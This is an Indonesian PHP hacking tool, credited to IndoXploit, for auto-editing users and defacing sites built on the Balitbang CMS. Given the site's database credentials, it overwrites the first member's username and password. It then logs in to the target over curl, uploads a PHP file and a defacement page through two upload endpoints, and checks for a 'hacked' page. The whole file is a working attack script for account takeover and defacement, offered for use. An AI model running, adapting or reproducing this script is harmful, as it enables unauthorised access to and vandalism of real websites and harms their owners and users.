<?php
//Tu5b0l3d

//thx to: IndoXploit, Hacker-Newbie.org
//http://indoxploit.blogspot.co.id/2015/10/auto-edit-user-and-deface-in-balitbang.html



    if($_POST['submitt']){


        $host = $_POST['host'];

        $username = $_POST['username'];

        $password = $_POST['password'];

        $db = $_POST['db'];

        $user_baru = $_POST['user_baru'];

        $password_baru = $_POST['password_baru'];

        $tanya = $_POST['tanya'];

        $target = $_POST['target'];

        $nick = $_POST['nick'];

        $prefix = $db.".t_member";

        $pass = md5("$password_baru");


        mysql_connect($host,$username,$password) or die("Koneksi gagal.. isi data yg bener");

        mysql_select_db($db) or die("Database tidak bisa dibuka.. Isi data yg bener");

 $tampil=mysql_query("SELECT * FROM $prefix ORDER BY userid ASC");
    $r=mysql_fetch_array($tampil);
        $id = $r[userid];


         mysql_query("UPDATE $prefix SET password='$pass',username='$user_baru' WHERE userid='$id'");





            if ($tanya == "y"){


                    $ch5 = curl_init("$target/member/ajax_login.php");
                curl_setopt($ch5, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch5, CURLOPT_POST, 1);
                curl_setopt($ch5, CURLOPT_POSTFIELDS, "user_name=$user_baru&password=$password_baru");
                curl_setopt($ch5, CURLOPT_COOKIEJAR,'coker_log');
                curl_setopt($ch5, CURLOPT_COOKIEFILE,'coker_log');
                $exec11 = curl_exec($ch5);



              if(preg_match("#yes#si",$exec11)){
                    echo "Username : $user_baru<br>";
                    echo "Password : $password_baru<br>";

                    $uploadfile="ganteng4.php";
                        $ch = curl_init("$target/functions/simmateriguru.php");
                        curl_setopt($ch, CURLOPT_POST, true);
                        curl_setopt($ch, CURLOPT_POSTFIELDS,
                        array('file'=>"@$uploadfile"));
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_COOKIEFILE, "coker_log");
                        $postResult = curl_exec($ch);

$namafile = "wew.php";
$fp2 = fopen($namafile,"w");
fputs($fp2,$nick);


                        $ch6 = curl_init("$target/materi/file.php");
                        curl_setopt($ch6, CURLOPT_POST, true);
                        curl_setopt($ch6, CURLOPT_POSTFIELDS,
                        array('file3'=>"@$namafile"));
                        curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch6, CURLOPT_COOKIEFILE, "coker_log");
                        $postResult = curl_exec($ch6);
                        curl_close($ch6);

                           $ch5 = "$target/k.php";
            $file2 = @file_get_contents($ch5);

            if(preg_match("#hacked#si",$file2)){
                        echo "<font color='green'>berhasil mepes...</font><br>";
                        echo "$target/k.php<br>";
                    }
                    else{
                        echo "<font color='red'>gagal mepes...</font><br>";
                        echo "coba aja manual: <br>";
                        echo "$target/member<br>";
                        echo "username: $user_baru<br>";
                        echo "password: $password_baru<br>";


                    }
                }
                else{
                    echo "Username dan Password tidak Berhasil Dibuat :p<br>";
                }




            }
            elseif($tanya == "n"){
            echo "Sukses<br>";
            echo "username: $user_baru<br>";
            echo "password: $password_baru<br>";

            }


        }



        else{

            echo '<html>

   <head>

       <title>Edit user in Balitbang</title>

   </head>



   <body>

           <center>

               <center

                       <h2>Edit user in Balitbang</h2>

                       <table>

                           <tr><td><form method="post" action="?action"></td></tr>

                           <tr><td><input type="text" name="host" placeholder="localhost"></td></tr>

                           <tr><td><input type="text" name="username" placeholder="User DB"></td></tr>

                           <tr><td><input type="text" name="password" placeholder="Password DB"></td></tr>

                           <tr><td><input type="text" name="db" placeholder="Database"></td></tr>


                           <tr><td><input type="text" name="user_baru" placeholder="Username Baru"></td></tr>

                           <tr><td><input type="text" name="password_baru" placeholder="Password Baru"></td></tr>
                           <tr><td></td></tr>
                           <tr><td></td></tr>


                           <tr><td> Auto Deface <input type="radio" name="tanya" value="y"> y <input type="radio" name="tanya" value="n"> n</td></tr>
                            <tr><td><input type="text" name="target" placeholder="www.IndoXploit.org"></td></tr>

                             <tr><td><input type="text" name="nick" placeholder="Hacked By Tu5b0l3d"></td></tr>

                           <tr><td><input type="submit" value="Submit" name="submitt"></td></tr>

                       </table>
                       *nb: kalo milih y ... silahkan masukin nama sitenya, kalo ngk tau nama sitenya, pilih n

           </center>

   </body>';

        }



?>
